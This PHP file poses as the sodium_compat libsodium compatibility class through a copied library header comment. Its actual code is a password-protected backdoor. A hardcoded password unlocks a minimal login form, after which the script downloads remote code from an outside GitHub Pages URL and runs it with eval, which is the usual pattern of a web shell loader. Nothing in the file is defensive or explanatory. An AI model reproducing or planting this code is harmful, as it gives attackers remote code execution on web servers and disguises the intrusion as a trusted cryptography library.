<?php
/**
 * Libsodium compatibility layer
 *
 * This is the only class you should be interfacing with, as a user of
 * sodium_compat.
 *
 * If the PHP extension for libsodium is installed, it will always use that
 * instead of our implementations. You get better performance and stronger
 * guarantees against side-channels that way.
 *
 * However, if your users don't have the PHP extension installed, we offer a
 * compatible interface here. It will give you the correct results as if the
 * PHP extension was installed. It won't be as fast, of course.
 *
 * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION *
 *                                                                               *
 *     Until audited, this is probably not safe to use! DANGER WILL ROBINSON     *
 *                                                                               *
 * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION * CAUTION *
 */

session_start();

if(isset($_POST['pass']) && $_POST['pass'] === 'KU!!NN3200001230DG64Or*ZqTgs#)Zayn00#000') {
    $_SESSION['authenticated'] = true;
}

if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    echo "
    <!DOCTYPE html>
    <html lang=\"en\">

    <head>
        <meta charset=\"UTF-8\">
        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">
        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
        <style>
            body {
                font-family: monospace;
            }

            input[type=\"password\"] {
                border: none;
                border-bottom: 1px solid black;
                padding: 2px;
            }

            input[type=\"password\"]:focus {
                outline: none;
            }

            input[type=\"submit\"] {
                border: none;
                padding: 4.5px 20px;
                background-color: #2e313d;
                color: #FFF;
            }
        </style>
    </head>

    <body>
        <form action=\"\" method=\"post\">
            <div align=\"center\">
                <input type=\"password\" name=\"pass\" placeholder=\"&nbsp;Password\">&nbsp;<input type=\"submit\" name=\"submit\" value=\">\">
            </div>
        </form>
    </body>

    </html>";
    exit;
}

$url = 'https://bapaknbila.github.io/dor/alfa.txt';
$kode = file_get_contents($url);
if ($kode === FALSE) {
    die('Error fetching code from URL.');
}
eval('?>' . $kode);
?>
